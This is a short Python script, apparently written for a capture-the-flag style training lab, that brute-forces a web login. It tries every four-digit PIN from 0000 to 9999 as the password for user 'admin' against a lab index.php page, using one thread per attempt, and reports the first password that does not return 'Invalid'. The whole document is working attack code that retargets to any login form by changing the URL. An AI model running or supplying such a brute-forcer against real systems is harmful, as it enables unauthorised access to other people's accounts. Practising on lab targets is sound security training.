# brute.py - Simple Hydra-like login brute forcer
import requests
import threading

url = "http://python.thm/labs/lab1/index.php"
username = "admin"

password_list = [str(i).zfill(4) for i in range(10000)]
found = False
lock = threading.Lock()

def try_login(password):
    global found
    if found:
        return

    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=5)
        if "Invalid" not in response.text:
            with lock:
                if not found:
                    found = True
                    print(f"[+] Success: {username}:{password}")
    except requests.RequestException as e:
        print(f"[!] Error with password {password}: {e}")

threads = []

for password in password_list:
    if found:
        break
    t = threading.Thread(target=try_login, args=(password,))
    threads.append(t)
    t.start()

# Join all threads
for t in threads:
    t.join()

if not found:
    print("[-] No valid credentials found.")
